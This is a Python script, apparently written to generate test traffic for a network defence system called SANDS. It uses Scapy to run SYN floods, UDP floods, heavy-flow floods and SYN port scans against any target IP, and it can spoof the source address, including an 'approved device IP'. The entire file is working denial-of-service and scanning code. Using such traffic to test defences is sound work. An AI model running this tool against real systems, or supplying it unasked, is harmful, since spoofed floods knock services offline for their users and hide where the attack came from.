import argparse
import time
import sys
import random
from scapy.all import IP, TCP, UDP, send, conf

def syn_flood(target_ip, target_port, count, src_ip=None, packets_per_flow=1):
    print(f"Starting SYN flood on {target_ip}:{target_port} with {count} flows ({packets_per_flow} pkts/flow)...")
    if src_ip:
        print(f"Spoofing source IP: {src_ip}")
    
    for i in range(count):
        # One flow key per iteration
        s_port = random.randint(1024, 65535)
        
        for j in range(packets_per_flow):
            ip_layer = IP(dst=target_ip)
            if src_ip:
                ip_layer.src = src_ip
            
            pkt = ip_layer/TCP(sport=s_port, dport=target_port, flags="S")
            send(pkt, verbose=False)
            
        if i % 100 == 0 and i > 0:
            print(f"Sent {i} flows...")
            
    print("SYN flood complete.")

def udp_flood(target_ip, target_port, count, src_ip=None, data_size=64, packets_per_flow=1):
    print(f"Starting UDP flood on {target_ip}:{target_port} with {count} flows...")
    payload = "X" * data_size
    for i in range(count):
        s_port = random.randint(1024, 65535)
        for j in range(packets_per_flow):
            ip_layer = IP(dst=target_ip)
            if src_ip:
                ip_layer.src = src_ip
            pkt = ip_layer/UDP(sport=s_port, dport=target_port)/payload
            send(pkt, verbose=False)
        if i % 100 == 0 and i > 0:
            print(f"Sent {i} flows...")
    print("UDP flood complete.")

def port_scan(target_ip, start_port, end_port, src_ip=None):
    print(f"Starting port scan on {target_ip} from port {start_port} to {end_port}...")
    for port in range(start_port, end_port + 1):
        s_port = random.randint(1024, 65535)
        ip_layer = IP(dst=target_ip)
        if src_ip:
            ip_layer.src = src_ip
        pkt = ip_layer/TCP(sport=s_port, dport=port, flags="S")
        send(pkt, verbose=False)
        if port % 10 == 0:
            print(f"Scanned up to port {port}...")
    print("Port scan complete.")

def main():
    parser = argparse.ArgumentParser(description="SANDS Attack Simulator (Enhanced)")
    parser.add_argument("--type", choices=["syn_flood", "udp_flood", "port_scan", "heavy_flow"], required=True, help="Type of attack to simulate")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--src-ip", help="Optional source IP to spoof (e.g. an approved device IP)")
    parser.add_argument("--port", type=int, default=80, help="Target port (for floods)")
    parser.add_argument("--count", type=int, default=1000, help="Number of flows to generate")
    parser.add_argument("--pkts-per-flow", type=int, default=1, help="Number of packets per flow (default 1)")
    parser.add_argument("--start-port", type=int, default=1, help="Start port (for port scan)")
    parser.add_argument("--end-port", type=int, default=100, help="End port (for port scan)")

    args = parser.parse_args()

    # 'heavy_flow' is just a syn_flood with many packets in one flow
    if args.type == "heavy_flow":
        args.type = "syn_flood"
        if args.pkts_per_flow == 1:
            args.pkts_per_flow = 100
        if args.count > 10:
            args.count = 5 # Just a few very heavy flows

    try:
        if args.type == "syn_flood":
            syn_flood(args.target, args.port, args.count, src_ip=args.src_ip, packets_per_flow=args.pkts_per_flow)
        elif args.type == "udp_flood":
            udp_flood(args.target, args.port, args.count, src_ip=args.src_ip, packets_per_flow=args.pkts_per_flow)
        elif args.type == "port_scan":
            port_scan(args.target, args.start_port, args.end_port, src_ip=args.src_ip)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"\nError occurred: {e}")

if __name__ == "__main__":
    if not conf.L3socket:
        print("Warning: Scapy might require administrative privileges to send raw packets.")
    main()
